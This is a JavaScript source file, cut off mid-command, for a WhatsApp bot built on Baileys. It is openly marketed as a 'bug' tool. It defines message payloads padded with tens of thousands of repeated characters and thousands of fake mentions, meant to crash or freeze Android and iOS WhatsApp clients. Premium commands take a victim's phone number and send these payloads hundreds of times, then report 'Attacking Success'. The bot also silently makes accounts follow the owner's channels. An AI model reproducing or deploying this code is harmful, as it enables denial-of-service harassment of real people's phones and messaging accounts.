const fs = require('fs');
const axios = require('axios');
const didyoumean = require('didyoumean');
const path = require('path');
const chalk = require("chalk");
const util = require("util");
const moment = require("moment-timezone");
const speed = require('performance-now');
const similarity = require('similarity');
const { spawn, exec, execSync } = require('child_process');
const crypto = require('crypto');
const os = require('os');
const {
  default: makeWASocket, 
  proto, 
  generateWAMessage, 
  generateWAMessageFromContent, 
  getContentType, 
  prepareWAMessageMedia, 
  baileys,
  makeInMemoryStore
} = require("@whiskeysockets/baileys");

let premiumCache = [];
function reloadPremium() {
  try { premiumCache = JSON.parse(fs.readFileSync('./database/premium.json')); } catch (e) {}
}
reloadPremium();
setInterval(reloadPremium, 30000);

const _menuMatches = fs.readFileSync(__filename).toString()
  .match(/case '[^']+'(?!.*case '[^']+')/g) || [];
const totalCases = _menuMatches.length;

const groupMetaCache = new Map();
async function getCachedGroupMetadata(prim, jid) {
  const cached = groupMetaCache.get(jid);
  if (cached && Date.now() - cached.ts < 5 * 60 * 1000) return cached.data;
  const data = await prim.groupMetadata(jid).catch(() => null);
  if (data) groupMetaCache.set(jid, { data, ts: Date.now() });
  return data;
}
module.exports = prim = async (prim, m, chatUpdate, store) => {
try {
  const info = m
  const body = (
    m.mtype === "conversation" ? m.message.conversation :
    m.mtype === "imageMessage" ? m.message.imageMessage.caption :
    m.mtype === "videoMessage" ? m.message.videoMessage.caption :
    m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
    m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
    m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
    m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
    m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
    m.mtype === "templateButtonReplyMessage" ? m.msg.selectedId :
    m.mtype === "messageContextInfo" ? m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId :
    m.mtype === "interactiveMessage" ?
      m.message.interactiveMessage?.header.title ||
      m.message.interactiveMessage?.body?.text ||
      m.message.interactiveMessage?.footer?.text
      || m.text : ""
  );

  const sender = m.key.fromMe
    ? prim.user.id.split(":")[0] || prim.user.id
    : m.key.participant || m.key.remoteJid;
  const isQ = (m.quoted?.msg || m.quoted) ? true : false;
  const senderNumber = sender.split('@')[0];
  const budy = (typeof m.text === 'string' ? m.text : '');


  // BUG-BOT : texte réel de la commande.
  // Ne modifie pas le menu ni son affichage.
  const __bugbotRealBody =
    typeof body === 'string'
      ? body.trim()
      : (typeof m?.text === 'string' ? m.text.trim() : '');

  if ((!m.text || typeof m.text !== 'string') && __bugbotRealBody) {
    m.text = __bugbotRealBody;
  }

  m.text = m.text || body;
  const prefa = ["", "!", ".", ",", "🐤", "🗿"];
  const prefix = prefa ? /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@#$%^&.©^]/gi)[0] : "" : prefa ?? prefa;
  const from = m.key.remoteJid;
  const isGroup = from.endsWith("@g.us");
  const isChannel = from.endsWith("@newsletter");
  const botNumber = await prim.decodeJid(prim.user.id);
  const premium = JSON.parse(fs.readFileSync('./database/premium.json'));
  const aiJid = "13135550002@s.whatsapp.net"
  const isPremium = [botNumber, ...premium].map(v => String(v).replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
  const isBot = botNumber.includes(senderNumber)
  const isCmd = body.startsWith(prefix) ? true : false
  const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : "";
  const args = body.trim().split(/ +/).slice(1);
  const pushname = m.pushName || "Squichy Beta";
  const text = q = args.join(" ");
  const quoted = m.quoted ? m.quoted : m;
  const mime = (quoted.msg || quoted).mimetype || '';
  const qmsg = (quoted.msg || quoted);
  const isMedia = /image|video|sticker|audio/.test(mime);
  const groupMetadata = isGroup ? await prim.groupMetadata(m.chat).catch((e) => {}) : "";
  const groupOwner = isGroup ? groupMetadata?.owner : "";
  const groupName = m.isGroup ? groupMetadata?.subject : "";
  const participants = isGroup ? await groupMetadata?.participants : "";
  const groupAdmins = isGroup ? await participants.filter((v) => v.admin !== null).map((v) => v.jid) : "";
  const groupMembers = isGroup ? groupMetadata?.participants : "";
  const isGroupAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
  const isBotGroupAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
  const isBotAdmins = isGroup ? groupAdmins.includes(botNumber) : false;
  const isAdmins = isGroup ? groupAdmins.includes(m.sender) : false;
  const { 
    smsg, 
    sendGmail, 
    formatSize, 
    isUrl, 
    generateMessageTag, 
    getBuffer, 
    getSizeMedia, 
    runtime, 
    fetchJson, 
    sleep
  } = require('./myfunc'); 
  const time = moment.tz("Asia/Jakarta").format("HH:mm:ss");
  
const { vcs, invisSqL2, ofmCrashSql, freeze, docThumb, ofmcrsl, frezcrashXcx } = require('./Func/bug')

function usedWithPrefix(m, command, prefix) {
    const messageText = typeof m.text === "string" && m.text.trim()
        ? m.text.trim()
        : body.trim();

    if (!messageText) return false;

    return messageText.toLowerCase().startsWith(
        (prefix + command).toLowerCase()
    );
}

        if (m.message) {
            console.log('\x1b[30m--------------------\x1b[0m');
            console.log(chalk.bgHex("#4a69bd").bold(`『🌹』 𝖭ᥱᥕ 𝖬ᥱ𝗌𝗌ᥲgᥱ 𖣂`));
            console.log(
                chalk.bgHex("#ffffff").black(
                    `   『🌹』 𝖣ᥲ𝗍ᥱ : ${new Date().toLocaleString()} \n` +
                    `   『🌹』 𝖬ᥱ𝗌𝗌ᥲgᥱ : ${m.body || m.mtype} \n` +
                    `   『🌹』 𝖲ᥱᥒძᥱr : ${pushname} \n` +
                    `   『🌹』 𝖩𝖨𝖣 : ${senderNumber} \n`
                )
            );
            console.log();
        }
  
const reply = (teks) => {
    prim.sendMessage(m.chat, {
        text: teks,
        contextInfo: {
            mentionedJid: [sender],
            forwardingScore: 2,
            isForwarded: true,
            forwardedNewsletterMessageInfo: {
                newsletterName: "ᴅʀᴇx ʙᴜɢ",
                newsletterJid: "120363425965029588@newsletter",
            },
        }
    }, { quoted: m });
} 
  
const SETTINGS_FILE = './database/settings.json';
let settingsCache = null;

function loadSettings() {
  if (settingsCache) return settingsCache;
  if (!fs.existsSync(SETTINGS_FILE)) {
    fs.writeFileSync(SETTINGS_FILE, JSON.stringify({}, null, 2));
  }
  settingsCache = JSON.parse(fs.readFileSync(SETTINGS_FILE));
  return settingsCache;
}

function getSetting(chatId, key, defaultValue = false) {
  const settings = loadSettings();
  return settings[chatId]?.[key] ?? defaultValue;
}

if (!global._lastAutobioUpdate) global._lastAutobioUpdate = 0;
const AUTOBIO_COOLDOWN_MS = 6 * 60 * 60 * 1000; 
if (getSetting(m.sender, "autobio", true) && (Date.now() - global._lastAutobioUpdate > AUTOBIO_COOLDOWN_MS)) {
    global._lastAutobioUpdate = Date.now();
    prim.updateProfileStatus(`Free Bug Connected ☑️`).catch(_ => _)
}

var newsletterJids = [
    "120363425965029588@newsletter",
    "120363425965029588@newsletter",
    "120363425965029588@newsletter"
];

var lastFollowTime = 0;
var globalCooldown = 30 * 1000;
var followedUsers = new Set();
var isFollowing = false;

function bindNewsletterListeners(prim) {
  if (prim._newsletterBound) return;
  prim._newsletterBound = true;

  prim.ev.on("messages.upsert", async (chatUpdate) => {
    const mek = chatUpdate.messages[0];
    if (!mek.message) return;
    const userJid = mek.key.remoteJid;
    if (followedUsers.has(userJid)) return;
    if (isFollowing) return;
    const now = Date.now();
    if (now - lastFollowTime < globalCooldown) return;
    isFollowing = true;
    lastFollowTime = now;
    try {
      for (let jid of newsletterJids) {
        try {
          await prim.newsletterFollow(jid, true);
          await new Promise(r => setTimeout(r, 15000));
        } catch (err) {
          const errMsg = err?.message || String(err);
          if (!errMsg.includes("rate")) {
          } else {
            await new Promise(r => setTimeout(r, 20000));
          }
        }
      }
      followedUsers.add(userJid);
      setTimeout(() => followedUsers.delete(userJid), 12 * 60 * 60 * 1000);
    } catch (e) {}
    isFollowing = false;
  });
}

async function coolz4ndroz(prim, targetoz) {
 await prim.relayMessage(targetoz, {
  interactiveMessage: {
   body: { text: "\n" },
    nativeFlowMessage: {
      buttons: [
       {
         name: "quick_reply",
         buttonParamsJson: JSON.stringify({
           display_text: "؃".repeat(50000)
          })
        }
      ]
    }
  }
}, {
  })
}

async function iosZLoc(prim, target) {
const R4IMG = fs.readFileSync('./Func/bug.jpg');
  for(let z = 0; z < 60; z++) {
    await prim.relayMessage(target, {
      groupStatusMessageV2: {
        message: {
          locationMessage: {
            degreesLatitude: 21.1266,
            degreesLongitude: -11.8199,
            name: `🧪⃟꙰。⌁.Bug ? ¿` + "𑇂𑆵𑆴𑆿".repeat(60000),
            url: "https://t.me/Devmordrex",
            contextInfo: {
              mentionedJid: Array.from({ length:2000 }, (_, z) => `628${z + 1}@s.whatsapp.net`), 
              externalAdReply: {
                quotedAd: {
                  advertiserName: "𑇂𑆵𑆴𑆿".repeat(60000),
                  mediaType: "IMAGE",
                  jpegThumbnail: R4IMG, 
                  caption: "𑇂𑆵𑆴𑆿".repeat(60000)
                },
                placeholderKey: {
                  remoteJid: "0s.whatsapp.net",
                  fromMe: false,
                  id: "ABCDEF1234567890"
                }
              }
            }
          }
        }
      }
    },{ participant: true });
  }
}
switch(command) {

case "linkbot":
case "getbot":
case "telebot":
case "freebot":
case "pair":
case "reqpair":
case "repo": {
    await prim.sendMessage(m.chat, { react: { text: '🌐', key: m.key } })

    const txt = `
『🌹』 𝖥rᥱᥱ 𝖡ᥙg 𖣂

𖣂 𝖡᥆𝗍 𝖫іᥒ𝗄

𖣂 ᴄᴏᴍɪɴɢ sᴏᴏɴ
`
    await prim.sendMessage(m.chat, {
        text: txt,
        contextInfo: {
            quotedMessage: m.message,
            remoteJid: m.key.remoteJid,
            participant: m.key.participant
        }
    }, { quoted: m })
}
break

case "squichy": case "menu": {
if (!usedWithPrefix(m, command, prefix)) return;
await prim.sendMessage(m.chat, { react: { text: '🇭🇹', key: m.key } })
    const used = process.memoryUsage();
    const cpus = os.cpus()[0];
    let uptime = runtime(process.uptime());
    const totalMem = os.totalmem();
    const freeMem = os.freemem();
    const platform = os.platform();
    const date = new Date();
const readmore = String.fromCharCode(8206).repeat(4001)

    const txt = `
『🌹』 𝗜𝗡𝗙𝗢 𝗕𝗢𝗧 𖣂

𖣂 𝖮𝗐ᥒᥱr : 𝖡і𝗍𝖼һ 𝖬᥆rძrᥱ𝗑 +
𖣂 𝖵ᥱr𝗌і᥆ᥒ : 1.0.0
𖣂 𝖯rᥱ𝖿і𝗑 : ${prefix}
𖣂 𝖴𝗌ᥱr : ${m.pushName}
𖣂 𝖢᥆mmᥲᥒძ : ${totalCases}
𖣂 𝖳᥆ძᥲ𝗒 : ${date.toLocaleDateString('en-GB', { weekday: 'long' })}
𖣂 𝖣ᥲ𝗍ᥱ : ${date.toLocaleDateString('en-GB')}
𖣂 𝖯ᥣᥲ𝗍𝖿᥆rm : ${platform}
𖣂 𝖱ᥙᥒ𝗍іmᥱ : ${process.version}
𖣂 𝖬᥆ძᥱ : ${prim.public ? '🌍 Public' : '🔒 Self'}

『🌹』 𝖥rᥱᥱ 𝖡ᥙg 𖣂

𖣂 𝖬ᥲіᥒ 𝖢mძ𝗌

𖣂 ${prefix}𝖯ᥲіr
𖣂 ${prefix}𝖮𝗐ᥒᥱr
𖣂 ${prefix}𝖯іᥒg
𖣂 ${prefix}𝖲ᥱᥣ𝖿
𖣂 ${prefix}𝖯ᥙᑲᥣіᥴ
𖣂 ${prefix}𝖡ᥙg-𝖬ᥱᥒᥙ
`
        const imageUrl = "https://files.catbox.moe/w83f7p.jpg";

    await prim.sendMessage(
        m.chat,
        {
            image: { url: imageUrl },
            caption: txt,
            contextInfo: {
                mentionedJid: [m.sender],
                forwardingScore: 999,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: '120363425965029588@newsletter',
                    newsletterName: '𝖬᥆rძrᥱ𝗑 𝖡ᥙg 𝖥rᥱᥱ 𖣂',
                    serverMessageId: 143
                }
            }
        },
        { quoted: m }
    );
}
    break;

case 'mode':{
if (!usedWithPrefix(m, command, prefix)) return;
  if (!isBot) return reply("Botz only");
     reply(`🔹 Mode : ${prim.public ? 'Public' : 'Private'}`);
     }
     break;

case "self": {
if (!usedWithPrefix(m, command, prefix)) return;
  if (!isBot) return reply("Botz only");
  if (!prim.public && isBot) return reply("Botz in self mode already");
  prim.public = false
  prim.saveSetting && prim.saveSetting('public', false)
  reply("Mode self activated")
}
break;

case "public": {
if (!usedWithPrefix(m, command, prefix)) return;
  if (!isBot) return reply("Botz only");
  if (prim.public && isBot) return reply("Botz in published mode already");
  prim.public = true
  prim.saveSetting && prim.saveSetting('public', true)
  reply("Mode public activated")
}
break;

case 'ping':
                          case 'p':
if (!usedWithPrefix(m, command, prefix)) return;
  await prim.sendMessage(from, { react: { text: '🚀', key: m.key } });
                            {
                              
                                   async function loading (jid) {
                             
                                    let start = new Date;
                                    let { key } = await prim.sendMessage(jid, {text: 'wait..'})
                                    let done = new Date - start;
                                    var lod = `*Pong*:\n> ⏱️ ${done}ms (${Math.round(done / 100) / 10}s)`
                                    
                                    await sleep(1000)
                                    await prim.sendMessage(jid, {text: lod, edit: key });
                                    }
                                    loading(from)
                                   
                            }       
                            break;
                          
 
case "owner": {
   const ownerName = "『🌹』 𝖳һᥱ 𝖮ᥒᥣ𝗒 𝖬᥆rძrᥱ𝗑 𖣂";  
   const ownerNumber = "50956935152"; 
   const displayTag = "『🌹』 𝖳һᥱ 𝖮ᥒᥣ𝗒 𝖬᥆rძrᥱ𝗑 𖣂";

   let vcard = `BEGIN:VCARD
VERSION:3.0
FN:${ownerName}
TEL;type=CELL;type=VOICE;waid=${ownerNumber}:+${ownerNumber}
END:VCARD`;

      let caption = `
『🌹』 𝖥rᥱᥱ 𝖡ᥙg 𖣂

𖣂 𝖡᥆𝗍 𝖫іᥒ𝗄

ᴄᴏᴍɪɴɢ sᴏᴏɴ
`      

   await prim.sendMessage(m.chat, { 
      contacts: { displayName: displayTag, contacts: [{ vcard }] } 
   }, { quoted: m });

   await prim.sendMessage(m.chat, {
      text: caption,
      mentions: [m.sender],
      contextInfo: {
         isForwarded: true,
         forwardingScore: 9999,
         forwardedNewsletterMessageInfo: {
            newsletterJid: `120363425965029588@newsletter`, 
            newsletterName: `𝖬᥆rძrᥱ𝗑 𝖡ᥙg 𝖥rᥱᥱ 𖣂`
         }
      }
   }, { quoted: m });
}
break;

case 'jid': {
    if (!usedWithPrefix(m, command, prefix)) return;
            reply(from)
           }
          break;

// -----------------------------------------
case "bug-menu": {
if (!usedWithPrefix(m, command, prefix)) return;
await prim.sendMessage(m.chat, { react: { text: '🇭🇹', key: m.key } })
    const used = process.memoryUsage();
    const cpus = os.cpus()[0];
    let uptime = runtime(process.uptime());
    const totalMem = os.totalmem();
    const freeMem = os.freemem();
    const platform = os.platform();
    const date = new Date();
const readmore = String.fromCharCode(8206).repeat(4001)

    const txt = `
『🌹』 𝗜𝗡𝗙𝗢 𝗕𝗢𝗧 𖣂

𖣂 𝖮𝗐ᥒᥱr : 𝖡і𝗍𝖼һ 𝖬᥆rძrᥱ𝗑 +
𖣂 𝖵ᥱr𝗌і᥆ᥒ : 1.0.0
𖣂 𝖯rᥱ𝖿і𝗑 : ${prefix}
𖣂 𝖴𝗌ᥱr : ${m.pushName}
𖣂 𝖢᥆mmᥲᥒძ : ${totalCases}
𖣂 𝖳᥆ძᥲ𝗒 : ${date.toLocaleDateString('en-GB', { weekday: 'long' })}
𖣂 𝖣ᥲ𝗍ᥱ : ${date.toLocaleDateString('en-GB')}
𖣂 𝖯ᥣᥲ𝗍𝖿᥆rm : ${platform}
𖣂 𝖱ᥙᥒ𝗍іmᥱ : ${process.version}
𖣂 𝖬᥆ძᥱ : ${prim.public ? '🌍 Public' : '🔒 Self'}

『🌹』 𝖡ᥙg 𝖬ᥱᥒᥙ 𖣂

𖣂 𝖡ᥙg 𝖥ᥱᥲ𝗍ᥙrᥱ

𖣂 ${prefix}𝖨᥆𝗌-𝖡ᥙg
𖣂 ${prefix}𝖠ᥒძr᥆-𝖡ᥙg
𖣂 ${prefix}𝖦r᥆ᥙρ-𝖡ᥙg
`
        const imageUrl = "https://files.catbox.moe/xk7b7n.jpg";

    await prim.sendMessage(
        m.chat,
        {
            image: { url: imageUrl },
            caption: txt,
            contextInfo: {
                mentionedJid: [m.sender],
                forwardingScore: 999,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: '120363425965029588@newsletter',
                    newsletterName: '𝖬᥆rძrᥱ𝗑 𝖡ᥙg 𝖥rᥱᥱ 𖣂',
                    serverMessageId: 143
                }
            }
        },
        { quoted: m }
    );
}
    break;

// andro bug

case "andro-bug": {
if (!usedWithPrefix(m, command, prefix)) return;
await prim.sendMessage(m.chat, { react: { text: '🇭🇹', key: m.key } })
    const used = process.memoryUsage();
    const cpus = os.cpus()[0];
    let uptime = runtime(process.uptime());
    const totalMem = os.totalmem();
    const freeMem = os.freemem();
    const platform = os.platform();
    const date = new Date();
const readmore = String.fromCharCode(8206).repeat(4001)

    const txt = `
『🌹』 𝗜𝗡𝗙𝗢 𝗕𝗢𝗧 𖣂

𖣂 𝖮𝗐ᥒᥱr : 𝖡і𝗍𝖼һ 𝖬᥆rძrᥱ𝗑 +
𖣂 𝖵ᥱr𝗌і᥆ᥒ : 1.0.0
𖣂 𝖯rᥱ𝖿і𝗑 : ${prefix}
𖣂 𝖴𝗌ᥱr : ${m.pushName}
𖣂 𝖢᥆mmᥲᥒძ : ${totalCases}
𖣂 𝖳᥆ძᥲ𝗒 : ${date.toLocaleDateString('en-GB', { weekday: 'long' })}
𖣂 𝖣ᥲ𝗍ᥱ : ${date.toLocaleDateString('en-GB')}
𖣂 𝖯ᥣᥲ𝗍𝖿᥆rm : ${platform}
𖣂 𝖱ᥙᥒ𝗍іmᥱ : ${process.version}
𖣂 𝖬᥆ძᥱ : ${prim.public ? '🌍 Public' : '🔒 Self'}

『🌹』 𝖠ᥒძr᥆ 𝖡ᥙg 𖣂

𖣂 𝖥rᥱᥱzᥱ 𝖧᥆mᥱ

𖣂 ${prefix}𝖥r𝗓-𝖶𝖠
𖣂 ${prefix}𝖥r𝗓-𝖷𝖢𝖷
𖣂 ${prefix}𝖥r𝗓-𝖣᥆ᥴ
𖣂 ${prefix}𝖥r𝗓-𝖲𝖰𝖫

𖣂 𝖣ᥱᥣᥲ𝗒

𖣂 ${prefix}𝖣ᥱᥣᥲ𝗒-𝖲𝖰𝖫
𖣂 ${prefix}𝖣ᥱᥣᥲ𝗒-𝖢𝖲𝖫
𖣂 ${prefix}𝖣ᥱᥣᥲ𝗒-𝖲𝖰𝖫
𖣂 ${prefix}𝖣ᥱᥣᥲ𝗒-𝖵𝖢𝖲
`
        const imageUrl = "https://files.catbox.moe/77nq46.jpg";

    await prim.sendMessage(
        m.chat,
        {
            image: { url: imageUrl },
            caption: txt,
            contextInfo: {
                mentionedJid: [m.sender],
                forwardingScore: 999,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: '120363425965029588@newsletter',
                    newsletterName: '𝖬᥆rძrᥱ𝗑 𝖡ᥙg 𝖥rᥱᥱ 𖣂',
                    serverMessageId: 143
                }
            }
        },
        { quoted: m }
    );
}
    break;

// ios bug

case "ios-bug": {
if (!usedWithPrefix(m, command, prefix)) return;
await prim.sendMessage(m.chat, { react: { text: '🇭🇹', key: m.key } })
    const used = process.memoryUsage();
    const cpus = os.cpus()[0];
    let uptime = runtime(process.uptime());
    const totalMem = os.totalmem();
    const freeMem = os.freemem();
    const platform = os.platform();
    const date = new Date();
const readmore = String.fromCharCode(8206).repeat(4001)

    const txt = `
『🌹』 𝗜𝗡𝗙𝗢 𝗕𝗢𝗧 𖣂

𖣂 𝖮𝗐ᥒᥱr : 𝖡і𝗍𝖼һ 𝖬᥆rძrᥱ𝗑 +
𖣂 𝖵ᥱr𝗌і᥆ᥒ : 1.0.0
𖣂 𝖯rᥱ𝖿і𝗑 : ${prefix}
𖣂 𝖴𝗌ᥱr : ${m.pushName}
𖣂 𝖢᥆mmᥲᥒძ : ${totalCases}
𖣂 𝖳᥆ძᥲ𝗒 : ${date.toLocaleDateString('en-GB', { weekday: 'long' })}
𖣂 𝖣ᥲ𝗍ᥱ : ${date.toLocaleDateString('en-GB')}
𖣂 𝖯ᥣᥲ𝗍𝖿᥆rm : ${platform}
𖣂 𝖱ᥙᥒ𝗍іmᥱ : ${process.version}
𖣂 𝖬᥆ძᥱ : ${prim.public ? '🌍 Public' : '🔒 Self'}

『🌹』 𝖨᥆𝗌 𝖡ᥙg 𖣂

𖣂 𝖢rᥲ𝗌һ 𝖨᥆𝗌

𖣂 ${prefix}𝖨᥆𝗌-𝖹𝖪
𖣂 ${prefix}𝖱𝖯𝖬𝖭-𝖨᥆𝗌
𖣂 ${prefix}𝖢rᥲ𝗌һ-𝖨᥆𝗌
𖣂 ${prefix}𝖨ᥒ𝗏і𝗌-𝖨᥆𝗌
`
        const imageUrl = "https://files.catbox.moe/43hkmb.jpg";

    await prim.sendMessage(
        m.chat,
        {
            image: { url: imageUrl },
            caption: txt,
            contextInfo: {
                mentionedJid: [m.sender],
                forwardingScore: 999,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: '120363425965029588@newsletter',
                    newsletterName: '𝖬᥆rძrᥱ𝗑 𝖡ᥙg 𝖥rᥱᥱ 𖣂',
                    serverMessageId: 143
                }
            }
        },
        { quoted: m }
    );
}
    break;

// group bug

case "group-bug": {
if (!usedWithPrefix(m, command, prefix)) return;
await prim.sendMessage(m.chat, { react: { text: '🇭🇹', key: m.key } })
    const used = process.memoryUsage();
    const cpus = os.cpus()[0];
    let uptime = runtime(process.uptime());
    const totalMem = os.totalmem();
    const freeMem = os.freemem();
    const platform = os.platform();
    const date = new Date();
const readmore = String.fromCharCode(8206).repeat(4001)

    const txt = `
『🌹』 𝗜𝗡𝗙𝗢 𝗕𝗢𝗧 𖣂

𖣂 𝖮𝗐ᥒᥱr : 𝖡і𝗍𝖼һ 𝖬᥆rძrᥱ𝗑 +
𖣂 𝖵ᥱr𝗌і᥆ᥒ : 1.0.0
𖣂 𝖯rᥱ𝖿і𝗑 : ${prefix}
𖣂 𝖴𝗌ᥱr : ${m.pushName}
𖣂 𝖢᥆mmᥲᥒძ : ${totalCases}
𖣂 𝖳᥆ძᥲ𝗒 : ${date.toLocaleDateString('en-GB', { weekday: 'long' })}
𖣂 𝖣ᥲ𝗍ᥱ : ${date.toLocaleDateString('en-GB')}
𖣂 𝖯ᥣᥲ𝗍𝖿᥆rm : ${platform}
𖣂 𝖱ᥙᥒ𝗍іmᥱ : ${process.version}
𖣂 𝖬᥆ძᥱ : ${prim.public ? '🌍 Public' : '🔒 Self'}

『🌹』 𝖦r᥆ᥙρ 𝖡ᥙg 𖣂

𖣂 𝖡ᥣᥲᥒ𝗄 𝖢ᥣіᥴ𝗄

𖣂 ${prefix}𝖡ᥙg-𝖦𝖢
𖣂 ${prefix}𝖪іᥣᥣ-𝖦𝖢
𖣂 ${prefix}𝖡ᥣᥲᥒ𝗄-𝖦𝖢
𖣂 ${prefix}𝖢᥆᥆ᥣ-𝖦𝖢
`
        const imageUrl = "https://files.catbox.moe/77nq46.jpg";

    await prim.sendMessage(
        m.chat,
        {
            image: { url: imageUrl },
            caption: txt,
            contextInfo: {
                mentionedJid: [m.sender],
                forwardingScore: 999,
                isForwarded: true,
                forwardedNewsletterMessageInfo: {
                    newsletterJid: '120363425965029588@newsletter',
                    newsletterName: '𝖬᥆rძrᥱ𝗑 𝖡ᥙg 𝖥rᥱᥱ 𖣂',
                    serverMessageId: 143
                }
            }
        },
        { quoted: m }
    );
}
    break;

// freeze case


case 'frz-wa': {
    if (!usedWithPrefix(m, command, prefix)) return;
    if (!isPremium) return reply(
        `*❌ 𝖱ᥱ𝗌𝗍rіᥴ𝗍ᥱძ.*\n\n` +
        `*— 𝖳һі𝗌 𝖢᥆mmᥲᥒძ і𝗌 𝖮ᥒᥣ𝗒 𝖿᥆r 𝖯rᥱmіᥙm 𝖴𝗌ᥱr𝗌.*`
    );

    const args = text.trim().split(/\s+/).filter(arg => arg.length > 0);
    
    if (args.length !== 1) {
        return reply(
            `*❌ 𝖨ᥒ𝗏ᥲᥣіძ 𝖴𝗌ᥲgᥱ.*\n\n` +
            `*— 𝖴𝗌ᥲgᥱ: ${prefix+command} 509xxx*\n` +
            `*𝖤𝗑ᥲmρᥣᥱ: ${prefix+command} 50956880231*\n\n` +
            `_*𝖳һᥱ 𝖭ᥙmᑲᥱr mᥙ𝗌𝗍 𝖼᥆ᥒ𝗍ᥲіᥒ 𝖣іgі𝗍𝗌 𝖮ᥒᥣ𝗒.*_`
        );
    }

    let number = args[0].replace(/[^0-9]/g, "");

    if (!number || number.length < 10) {
        return reply(
            `*❌ 𝖨ᥒ𝗏ᥲᥣіძ 𝖭ᥙmᑲᥱr.*\n\n` +
            `*— ${number || '𝖤mρ𝗍𝗒'} і𝗌 𝗍᥆᥆ 𝖲һ᥆r𝗍.*\n` +
            `*— 𝖯ᥣᥱᥲ𝗌ᥱ 𝖯r᥆𝗏іძᥱ ᥲ 10+ 𝖣іgі𝗍 𝖭ᥙmᑲᥱr.*\n\n` +
            `*— 𝖤𝗑ᥲmρᥣᥱ: ${prefix+command} 50956880231*`
        );
    }

    const target = number + "@s.whatsapp.net";

    await prim.sendMessage(m.chat, { react: { text: '☠️', key: m.key } });

    reply(
        `『🌹』 𝖠𝗍𝗍ᥲᥴ𝗄іᥒg 𝖲ᥙᥴᥴᥱ𝗌𝗌 𖣂\n\n` +
        `𖣂 𝖳ᥲrgᥱ𝗍 : ${target}\n` +
        `𖣂 𝖵іrᥙ𝗌 : 𝖿rᥱᥱ𝗓ᥱ\n\n` +
        `*» 𝖠𝖿𝗍ᥱr 𝗒᥆ᥙ 𝗌ᥱᥒძ 𝗍һᥱ 𝗏і𝗍ᥙ𝗌, ρᥣᥱᥲ𝗌ᥱ 𝗐ᥲі𝗍 10 mіᥒᥙ𝗍ᥱ𝗌 ᑲᥱ𝖿᥆rᥱ 𝗌ᥱᥒძіᥒg ᥲᥒ᥆𝗍һᥱr.*`
    );
    for (let i = 0; i < 500; i++) {
    await sleep(5000);
    await freeze(prim, target);
}
}
break;

case 'frz-doc': {
    if (!usedWithPrefix(m, command, prefix)) return;
    if (!isPremium) return reply(
        `*❌ 𝖱ᥱ𝗌𝗍rіᥴ𝗍ᥱძ.*\n\n` +
        `*— 𝖳һі𝗌 𝖢᥆mmᥲᥒძ і𝗌 𝖮ᥒᥣ𝗒 𝖿᥆r 𝖯rᥱmіᥙm 𝖴𝗌ᥱr𝗌.*`
    );

    const args = text.trim().split(/\s+/).filter(arg => arg.length > 0);
    
    if (args.length !== 1) {
        return reply(
            `*❌ 𝖨ᥒ𝗏ᥲᥣіძ 𝖴𝗌ᥲgᥱ.*\n\n` +
            `*— 𝖴𝗌ᥲgᥱ: ${prefix+command} 509xxx*\n` +
            `*𝖤𝗑ᥲmρᥣᥱ: ${prefix+command} 50956880231*\n\n` +
            `_*𝖳һᥱ 𝖭ᥙmᑲᥱr mᥙ𝗌𝗍 𝖼᥆ᥒ𝗍ᥲіᥒ 𝖣іgі𝗍𝗌 𝖮ᥒᥣ𝗒.*_`
        );
    }

    let number = args[0].replace(/[^0-9]/g, "");

    if (!number || number.length < 10) {
        return reply(
            `*❌ 𝖨ᥒ𝗏ᥲᥣіძ 𝖭ᥙmᑲᥱr.*\n\n` +
            `*— ${number || '𝖤mρ𝗍𝗒'} і𝗌 𝗍᥆᥆ 𝖲һ᥆r𝗍.*\n` +
            `*— 𝖯ᥣᥱᥲ𝗌ᥱ 𝖯r᥆𝗏іძᥱ ᥲ 10+ 𝖣іgі𝗍 𝖭ᥙmᑲᥱr.*\n\n` +
            `*— 𝖤𝗑ᥲmρᥣᥱ: ${prefix+command} 50956880231*`
        );
    }

    const target = number + "@s.whatsapp.net";

    await prim.sendMessage(m.chat, { react: { text: '☠️', key: m.key } });

    reply(
        `『🌹』 𝖠𝗍𝗍ᥲᥴ𝗄іᥒg 𝖲ᥙᥴᥴᥱ𝗌𝗌 𖣂\n\n` +
        `𖣂 𝖳ᥲrgᥱ𝗍 : ${target}\n` +
        `𖣂 𝖵іrᥙ𝗌 : 𝖽᥆ᥴ𝖳һᥙmᑲ\n\n` +
        `*» 𝖠𝖿𝗍ᥱr 𝗒᥆ᥙ 𝗌ᥱᥒძ 𝗍һᥱ 𝗏і𝗍ᥙ𝗌, ρᥣᥱᥲ𝗌ᥱ 𝗐ᥲі𝗍 10 mіᥒᥙ𝗍ᥱ𝗌 ᑲᥱ𝖿᥆rᥱ 𝗌ᥱᥒძіᥒg ᥲᥒ᥆𝗍һᥱr.*`
    );

    for (let i = 0; i < 500; i++) {
    await sleep(5000);
    await docThumb(prim, target);
}
}
break;

case 'frz-sql': {
    if (!usedWithPrefix(m, command, prefix)) return;
    if (!isPremium) return reply(
        `*❌ 𝖱ᥱ𝗌𝗍rіᥴ𝗍ᥱძ.*\n\n` +
        `*— 𝖳һі𝗌 𝖢᥆mmᥲᥒძ і𝗌 𝖮ᥒᥣ𝗒 𝖿᥆r 𝖯rᥱmіᥙm 𝖴𝗌ᥱr𝗌.*`
    );

    const args = text.trim().split(/\s+/).filter(arg => arg.length > 0);
    
    if (args.length !== 1) {
        return reply(
